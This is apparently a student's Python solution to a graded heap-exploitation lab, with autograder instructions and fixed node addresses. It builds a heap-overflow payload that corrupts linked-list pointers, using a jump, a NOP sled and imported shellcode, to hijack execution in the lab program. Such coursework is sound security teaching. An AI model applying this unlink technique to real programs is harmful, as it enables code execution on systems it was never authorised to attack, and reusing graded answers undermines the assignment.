#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# You MUST fill in the values of the a, b, and c node pointers below. When you
# use heap addresses in your main solution, you MUST use these values or
# offsets from these values. If you do not correctly fill in these values and use
# them in your solution, the autograder may be unable to correctly grade your
# solution.

# IMPORTANT NOTE: When you pass your 3 inputs to your program, they are stored
# in memory inside of argv, but these addresses will be different then the
# addresses of these 3 nodes on the heap. Ensure you are using the heap
# addresses here, and not the addresses of the 3 arguments inside argv.

node_a = 0x080dd2f0
node_b = 0x080dd320
node_c = 0x080dd350

# Example usage of node address with offset -- Feel free to ignore
a_plus_4 = pack("<I", node_a + 4)

# Your code here
# b->data = 0x080dd328
# write small to big, so we write to node_c next & prev using node_b data
data1 = b'\xeb\x08' + b'\x90'*8 + shellcode
data2 = b'\x22' * 40 + pack('<I', node_a+8) + pack('<I', 0xfffefdfc)
data3 = b'\x33'*32

sys.stdout.buffer.write(data1 + b' ' + data2 + b' ' + data3)
